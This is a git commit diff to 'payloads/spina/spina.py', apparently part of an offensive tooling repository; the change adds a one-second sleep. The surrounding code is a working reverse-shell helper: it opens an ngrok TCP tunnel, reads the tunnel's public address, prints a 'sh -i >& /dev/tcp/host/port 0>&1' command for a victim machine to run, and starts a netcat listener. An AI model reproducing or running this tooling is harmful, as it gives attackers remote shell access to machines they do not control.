bc901f8de56b41976943be38f37f4205a54a6884
komodo <68278515+komodoooo@users.noreply.github.com>
2024-03-06 19:31:05 +0100

    Update spina.py

--- payloads/spina/spina.py
+++ payloads/spina/spina.py
@@ -5,6 +5,7 @@ print("""\n\tSPINA\n\t  _____
 def main(port:int)->None:
     subprocess.Popen(args=["ngrok","tcp",str(port)],stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)
     a=subprocess.Popen(args=["curl","-s","localhost:4040/api/tunnels"],stdout=subprocess.PIPE)
+    __import__("time").sleep(1)                     #delay to start ngrok
     b=json.loads(a.communicate()[0])['tunnels'][0]['public_url'].split("//")[1].split(":")
     print(f"\nConnection command: sh -i >& /dev/tcp/{b[0]}/{b[1]} 0>&1\n")
     os.system(f"nc -lvnp {port}")
